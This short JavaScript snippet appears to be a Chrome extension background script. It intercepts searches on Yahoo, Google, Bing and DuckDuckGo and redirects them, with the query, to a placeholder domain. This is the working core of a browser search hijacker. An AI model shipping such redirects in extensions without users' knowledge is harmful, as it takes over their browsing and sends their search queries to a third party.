chrome.webRequest.onBeforeRequest.addListener(
  function(details) {
    if (details.type !== "main_frame") {
      return;
    }

    let searchQuery = "";

    const matchPattern = redirectPatterns.some(x => {
      if (details.url.match(x.url)) {
        searchQuery = new URL(details.url).searchParams.get(
          x.searchQuerySymbol
        );
        return true;
      }
    });

    if (matchPattern && searchQuery) {
      return { redirectUrl: `https://yourdomain.com/search?${searchQuery}` };
    }
  },
  {
    urls: [
      "*://search.yahoo.com/*",
      "*://www.google.com/*",
      "*://www.bing.com/*",
      "*://duckduckgo.com/*"
    ]
  },
  ["blocking"]
);

const redirectPatterns = [
  { url: "://search.yahoo.com/search", searchQuerySymbol: "p" },
  { url: "://www.google.com/search", searchQuerySymbol: "q" },
  { url: "://www.bing.com/search", searchQuerySymbol: "q" },
  { url: "://duckduckgo.com/", searchQuerySymbol: "q" },
];
